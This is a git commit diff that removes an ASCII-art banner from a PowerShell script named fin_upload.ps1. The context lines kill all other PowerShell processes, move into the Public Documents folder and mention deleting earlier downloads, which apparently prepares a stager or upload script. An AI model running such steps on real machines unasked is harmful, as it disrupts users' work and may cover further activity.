f66108dc809557219d012dcd49d5ce31cfe85782
Bakri-l <95353700+Bakri-l@users.noreply.github.com>
2023-10-11 17:08:28 +0800

    Update fin_upload.ps1

--- fin_upload.ps1
+++ fin_upload.ps1
@@ -1,9 +1,3 @@
-#                      _                        
-#  _   _  ___  _   _  | | ___ __   _____      __
-# | | | |/ _ \| | | | | |/ /  _ \ / _ \ \ /\ / /
-# | |_| | (_) | |_| |_|   <| | | | (_) \ V  V / 
-#  \__, |\___/ \__,_(_)_|\_\_| |_|\___/ \_/\_/  
-#  |___/                                        
 Get-Process Powershell  | Where-Object { $_.ID -ne $pid } | Stop-Process #Kill all powershell process except the one running
 Set-Location C:\Users\Public\Documents #Go to public documents location
 #Delete all files downloaded before
